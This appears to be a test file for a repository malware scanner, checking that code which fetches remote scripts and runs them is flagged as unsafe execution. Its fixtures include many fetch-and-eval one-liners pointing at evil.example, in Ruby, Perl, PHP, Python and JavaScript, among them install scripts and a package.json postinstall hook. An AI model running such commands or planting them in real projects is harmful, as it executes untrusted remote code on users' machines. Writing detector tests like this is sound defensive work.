import { expect, test } from "bun:test";
import { inspectRepository } from "./bounded-scan";

/**
 * PRD section 8 requires the bounded malicious-code scan to flag unsafe
 * execution. An eval whose argument is fetched from the network is the
 * same act whatever language fetches it; the fetch APIs of Ruby, Perl
 * and PHP, and a PHP include of a remote URL, are covered here.
 */
function inspected(path: string, text: string) {
  return inspectRepository({
    files: [{ path, bytes: new TextEncoder().encode(text) }],
  });
}

function categories(inspection: ReturnType<typeof inspected>) {
  return inspection.findings.map(
    (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
  );
}

const FETCHED_CODE: Record<string, [string, string]> = {
  "ruby eval of URI.open in an install script": [
    "install.sh",
    "#!/bin/sh\nruby -ropen-uri -e \"eval(URI.open('https://evil.example/x.rb').read)\"\n",
  ],
  "ruby eval of Net::HTTP.get in an install script": [
    "install.sh",
    "#!/bin/sh\nruby -rnet/http -e \"eval(Net::HTTP.get(URI('https://evil.example/x.rb')))\"\n",
  ],
  "ruby eval of Net::HTTP.get_response in an install script": [
    "install.sh",
    "#!/bin/sh\nruby -rnet/http -e \"eval(Net::HTTP.get_response(URI('https://evil.example/x.rb')).body)\"\n",
  ],
  "ruby eval of Net::HTTP.get with URI.parse in an install script": [
    "install.sh",
    "#!/bin/sh\nruby -rnet/http -e \"eval(Net::HTTP.get(URI.parse('https://evil.example/x.rb')))\"\n",
  ],
  "ruby eval of Net::HTTP.get_response with URI.parse in an install script": [
    "install.sh",
    "#!/bin/sh\nruby -rnet/http -e \"eval(Net::HTTP.get_response(URI.parse('https://evil.example/x.rb')).body)\"\n",
  ],
  "ruby eval of Net::HTTP.get with a spaced URI .parse in an install script": [
    "install.sh",
    "#!/bin/sh\nruby -rnet/http -e \"eval(Net::HTTP.get(URI .parse('https://evil.example/x.rb')))\"\n",
  ],
  "ruby eval of Net::HTTP.get_response with a line-broken URI.parse in Ruby source":
    [
      "tools/setup.rb",
      "require 'net/http'\neval(Net::HTTP.get_response(URI\n  .parse('https://evil.example/x.rb')).body)\n",
    ],
  "ruby eval of Net::HTTP.get with URI.parse in Ruby source": [
    "tools/setup.rb",
    "require 'net/http'\neval(Net::HTTP.get(URI.parse('https://evil.example/x.rb')))\n",
  ],
  "ruby eval of URI.open in Ruby source": [
    "tools/setup.rb",
    "require 'open-uri'\neval(URI.open('https://evil.example/x.rb').read)\n",
  ],
  "perl eval of an LWP get in an install script": [
    "install.sh",
    "#!/bin/sh\nperl -MLWP::Simple -e \"eval(get('https://evil.example/x.pl'))\"\n",
  ],
  "php eval of file_get_contents in an install script": [
    "install.sh",
    "#!/bin/sh\nphp -r \"eval(file_get_contents('https://evil.example/x.php'));\"\n",
  ],
  "php eval of file_get_contents in PHP source": [
    "tools/setup.php",
    "<?php eval(file_get_contents('https://evil.example/x.php'));\n",
  ],
  "php include of a remote URL in an install script": [
    "install.sh",
    "#!/bin/sh\nphp -r \"include 'https://evil.example/x.php';\"\n",
  ],
  "php require of a remote URL in an install script": [
    "install.sh",
    "#!/bin/sh\nphp -r \"require 'https://evil.example/x.php';\"\n",
  ],
  "php include_once of a remote URL in PHP source": [
    "tools/setup.php",
    "<?php include_once('https://evil.example/x.php');\n",
  ],
};

test("code fetched through a Ruby, Perl or PHP idiom and executed is unsafe execution", () => {
  for (const [name, [path, body]] of Object.entries(FETCHED_CODE)) {
    expect({ name, findings: categories(inspected(path, body)) }).toEqual({
      name,
      findings: [`${path}:unsafe-execution:high`],
    });
  }
});

test("a fetched-code payload in an install hook is install content", () => {
  const inspection = inspected(
    "package.json",
    '{"scripts":{"postinstall":"php -r \\"eval(file_get_contents(\'https://evil.example/x.php\'));\\""}}\n',
  );
  // The pair the pipe rules produce for a hook payload: the manifest
  // text itself, and the hook read as install content.
  expect(categories(inspection)).toEqual([
    "package.json:unsafe-execution:high",
    "package.json#scripts:unsafe-execution:high",
  ]);
});

test("fetching data without executing it keeps no finding", () => {
  for (const [path, body] of [
    [
      "install.sh",
      "#!/bin/sh\nperl -MLWP::Simple -e \"print get('https://example.com/data.txt')\"\n",
    ],
    [
      "install.sh",
      "#!/bin/sh\nphp -r \"echo file_get_contents('https://example.com/data.json');\"\n",
    ],
    [
      "tools/fetch.rb",
      "require 'open-uri'\nputs URI.open('https://example.com/data.json').read\n",
    ],
    [
      "tools/fetch.rb",
      "require 'net/http'\nputs Net::HTTP.get(URI.parse('https://example.com/data.json'))\n",
    ],
  ] as const) {
    expect({ path, findings: categories(inspected(path, body)) }).toEqual({
      path,
      findings: [],
    });
  }
});

test("an eval or include of local content keeps no finding", () => {
  for (const [path, body] of [
    ["tools/setup.php", "<?php eval(file_get_contents('local.php'));\n"],
    [
      "tools/setup.php",
      "<?php include 'local.php';\nrequire_once __DIR__ . '/lib.php';\n",
    ],
    ["tools/setup.php", "<?php include $path;\n"],
    ["tools/run.js", "const code = 'console.log(1)';\neval(code);\n"],
  ] as const) {
    expect({ path, findings: categories(inspected(path, body)) }).toEqual({
      path,
      findings: [],
    });
  }
});

test("fetch APIs the fetched-code rule already names are reported once, by that rule alone", () => {
  // Both payloads are the same act the earlier fetched-code rule reads
  // (a Python requests call, a JavaScript fetch): each is reported
  // exactly once, and the idiom rule adds no second report for it.
  for (const [path, body] of [
    [
      "tools/setup.py",
      "import requests\nexec(requests.get('https://evil.example/x.py').text)\n",
    ],
    [
      "tools/setup.js",
      "eval(await (await fetch('https://evil.example/x.js')).text())\n",
    ],
  ] as const) {
    expect({ path, findings: categories(inspected(path, body)) }).toEqual({
      path,
      findings: [`${path}:unsafe-execution:high`],
    });
  }
});

test("response objects and unrelated later fetches are not executed bodies", () => {
  for (const body of [
    'eval(URI.open("https://example.com/payload.rb"))',
    'eval(open("https://example.com/payload.rb").read)',
    'eval(Net::HTTP.get_response(URI("https://example.com/payload.rb")))',
    'eval(Net::HTTP.get_response(URI.parse("https://example.com/payload.rb")))',
    'eval("puts :local"); URI.open("https://example.com/data").read',
    'exec("local command"); file_get_contents("https://example.com/data")',
    'eval(file_get_contents("https://example.com/data").length)',
    'regexp.exec(get("https://example.com/data"))',
  ]) {
    expect({
      body,
      findings: categories(inspected("tools/setup.rb", body)),
    }).toEqual({ body, findings: [] });
  }
});
